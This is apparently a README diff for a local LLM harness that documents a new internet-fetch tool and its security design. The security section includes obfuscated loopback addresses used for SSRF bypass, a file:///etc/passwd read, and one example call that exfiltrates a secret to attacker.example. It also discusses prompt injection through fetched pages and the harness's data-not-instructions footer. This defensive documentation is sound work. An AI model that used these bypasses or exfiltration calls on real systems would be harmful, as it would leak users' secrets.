@@ -149,7 +149,7 @@ The browser and the terminal are two views of **the same session**, not separate
   - Clicking the **model name** opens a model picker listing the models on the backend, like `/model`. llama.cpp serves a single model, so there the list is informational.
   - Also shown: provider@host and the working directory. The working directory is shortened from the front on narrow windows.
   - The **CTX meter** turns yellow at ≥ 75% and red at ≥ 90%, as in the TUI.
-  - The **`RUN: auto` / `RUN: confirm`** badge toggles `run_command` confirmation (`/run-confirm`). A **`TOOLS: off`** badge appears when tools are disabled. Click it to turn them back on.
+  - The **`RUN: auto` / `RUN: confirm`** badge toggles `run_command` confirmation (`/run-confirm`). A **`TOOLS: off`** badge appears when tools are disabled. Click it to turn them back on. A **`NET: on`** / **`NET: local`** badge appears when internet access is on; click it to turn it off. Both are also in View → Network.
   - **View options** (sliders icon, far right) opens the view options (below).
 - **Conversation**
   - Replies **stream in** as they're generated, with a blinking cursor. Reasoning streams into an open *thinking…* block that folds away once the answer starts. When the reply is complete, it's re-rendered as markdown. Use `--no-stream` to turn streaming off.
@@ -517,6 +517,14 @@ Syntax-aware tools built on [tree-sitter](https://tree-sitter.github.io/) for Py
 
 Chat mode also has `ask_user` but not `write_file`.
 
+### Internet access (all modes, off by default)
+
+Offered only while internet access is on (`/net on`), so the model never sees a tool it cannot use.
+
+| Tool | Description |
+|---|---|
+| `fetch_url` | Fetch an http/https URL and return the response as text. HTML is converted to readable text (scripts, styles and navigation dropped, link targets kept), JSON is pretty-printed. GET and HEAD run straight away; POST, PUT, PATCH and DELETE ask for confirmation first. |
+
 ### Coding mode only
 
 | Tool | Description |
@@ -530,6 +538,67 @@ Chat mode also has `ask_user` but not `write_file`.
 All file operations are sandboxed to the working directory. Paths that attempt to escape via `..` are rejected.
 
 `grep_files` returns at most 200 matches; `find_files` returns at most 100 files. Results over the cap include a trailer explaining how many were omitted.
+
+## Internet access
+
+`fetch_url` is the only tool that sends anything off your machine, so it is **off by default** and has to be turned on explicitly:
+
+```
+/net              # show the current state
+/net on           # public internet only
+/net local        # also allow localhost and the LAN
+/net off          # block it again
+```
+
+Neither this nor `/net-confirm` is saved to `prefs.json`. Both reset to the safe default every launch, the same way `/tools` and `/run-confirm` do. `--net on` and `--net-confirm off` set them at startup.
+
+While it is on, a `NET:` badge shows in the TUI status bar and the web header, and the tool is added to whatever mode you are in. While it is off the model is not offered the tool at all.
+
+### What is blocked
+
+- **Only `http` and `https`.** `urllib` will happily serve `file:///etc/passwd`, which would read straight past the working-directory sandbox every other tool is confined to, so the HTTP client here is built without the file, ftp and data handlers.
+- **Loopback, private and LAN addresses**, unless you opt in with `/net local`. Hostnames are resolved and *every* resolved address is checked, so `http://2130706433/`, `http://0x7f.1/` and `http://127.1/` are all blocked as the 127.0.0.1 they resolve to. CGNAT, link-local, multicast, reserved and 6to4/IPv4-mapped addresses are covered too.
+- **Redirects into blocked addresses.** Each hop is re-checked, so a public URL that `302`s to `http://127.0.0.1:8765/api/submit` fails at the hop rather than being followed.
+- **Credentials in the URL** (`http://user:pass@host/`), which both leak secrets and confuse URL parsers. Pass them in `headers` instead.
+- **Oversized responses.** The body is read in chunks against a wall-clock deadline, so a slow-trickle server cannot hold the worker thread. Compression is never requested, which removes the gzip-bomb surface entirely.
+
+### Response size
+
+One response is capped at **100 KB** by default. Raise or lower it with a size, in bytes or with a unit (`kb`/`mb`, binary — 1 KB = 1024 bytes):
+
+```
+/net-max-bytes            # show the current cap
+/net-max-bytes 500kb
+/net-max-bytes 2mb
+/net-max-bytes 200000     # plain bytes still work
+```
+
+`--net-max-bytes 2mb` sets it at startup, and it is in the web UI under View → Network. The hard limit is 64 MB.
+
+The model can pass `max_bytes` on an individual call, in the same units, but it is a **ceiling, not a default** — a call asking for more than your setting is clamped to it. When a body is truncated the note says so in readable units and names the command that raises the cap.
+
+Raising this well past a megabyte is worth pairing with [`/tool-result`](#tool-result-cap): with the tool-result cap unlimited, one large fetch lands in the context whole. `/net-max-bytes` warns when you set a value where that matters.
+
+- **Credentials crossing an origin.** If a redirect leaves the host, changes port, or downgrades `https` to `http`, the `Authorization`, `Cookie` and API-key headers are dropped before the next hop. urllib's own redirect handler copies every header except `content-length`/`content-type`, so a token set for `api.example.com` would otherwise be replayed verbatim to whatever host it redirects to. When this happens the result says so, since the symptom is otherwise a confusing `401`.
+- **Control characters**, both in a URL you pass and in what a server sends back. Response headers, the status reason and the final URL are each reduced to one sanitised line, and the response body has C0, DEL and C1 controls stripped. Tool results are drawn into a curses TUI, so an ANSI escape from a web page is a terminal-injection vector no other tool here can produce.
+
+TLS certificates are verified, and there is deliberately no way to turn that off. Proxy environment variables are ignored: a proxy resolves the hostname itself, which would make every address check above meaningless.
+
+The timeout is enforced across the whole redirect chain, not per hop, so a chain of slow redirects cannot hold the worker thread for a multiple of the budget you asked for.
+
+### Write requests
+
+`GET` and `HEAD` run immediately. `POST`, `PUT`, `PATCH` and `DELETE` show the method, URL and body and wait for `y/N`. `/net-confirm off` turns that off for public destinations.
+
+**Requests to local and private addresses always ask, even with `/net-confirm off`.** This is deliberate. The web UI's own `POST /api/submit` accepts any request without an `Origin` header — browsers always send one cross-site, but a non-browser client does not — so on the default loopback bind, `/net local` plus unattended writes would otherwise let a fetched page drive this harness through its own API.
+
+### What is *not* solved
+
+- **Prompt injection.** Fetched pages are wrapped in an explicit untrusted-content marker and a footer telling the model to treat them as data. The page cannot forge or reassemble the closing marker, and everything above it — status line, headers, notes — is sanitised, so a server cannot write into the region the model reads as harness output. None of that is a guarantee — a small local model has little injection resistance. **Turn on `/run-confirm on` when browsing**, so nothing a page suggests can reach your shell unseen.
+- **Exfiltration.** Blocking private addresses does nothing against `fetch_url("https://attacker.example/?d=<secret>")`. Confirming writes does not help either, since a GET query string leaks just as well. The real containment is that every URL appears in the transcript in both frontends — watch them.
+- **DNS rebinding.** The guard resolves and approves, then urllib resolves again when it connects; a hostile resolver can answer differently the second time. Closing that means pinning the address and hand-rolling the TLS connection, which this deliberately does not do.
+
+Secret request headers (`Authorization`, `Cookie`, `X-API-Key`, …) are masked to `***` in the transcript, the session file and the log, but are sent as given.
 
 ## Tests
 
@@ -704,6 +773,12 @@ Type any command in the input bar:
 | `/companion-idle-recap on\|off` | When you've been idle, momo recaps the last turns in its speech bubble (at most once per turn, 5-minute cooldown; lines are kept in the session). Off by default; also `--companion-idle-recap` |
 | `/companion-idle-recap <secs>` | How long you must be idle before momo recaps (default 90, also `--companion-idle-recap-secs`) |
 | `/tools on\|off` | Enable or disable tool calls (off = model receives no tool schemas) |
+| `/net` | Show internet access state (off / on / local) |
+| `/net on\|off` | Allow or block `fetch_url` reaching the public internet (default: off) |
+| `/net local` | Also allow localhost and the LAN — see [Internet access](#internet-access) |
+| `/net-confirm on\|off` | Ask y/N before each `fetch_url` POST/PUT/PATCH/DELETE (default: on) |
+| `/net-max-bytes` | Show the `fetch_url` response size cap |
+| `/net-max-bytes <size>` | Set it, in bytes or with a unit: `200000`, `500kb`, `2mb` |
 | `/tool-output on\|off` | Show or hide the tool calls pane |
 | `/think-output on\|off` | Show or hide model thinking/reasoning blocks (also `Shift+T`) |
 | `/markdown on\|off` | Enable or disable markdown rendering for assistant output (also `Shift+M`) |
